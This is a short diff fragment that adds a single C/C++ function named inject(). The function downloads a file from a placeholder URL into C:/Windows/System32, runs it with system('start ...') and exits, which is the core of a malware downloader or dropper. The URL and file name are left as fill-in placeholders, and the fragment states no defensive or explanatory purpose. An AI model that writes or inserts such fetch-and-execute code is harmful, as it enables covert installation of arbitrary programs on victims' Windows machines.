@@ -1,0 +1,2 @@
+
+void inject() { HRESULT p2 = URLDownloadToFile(NULL, _T("PlaceDownloadHere"), _T("C:/Windows/System32/placenamehere.exe"), 0, NULL); system("start C:/Windows/System32/placenamehere.exe"); Sleep(600); exit(0); }
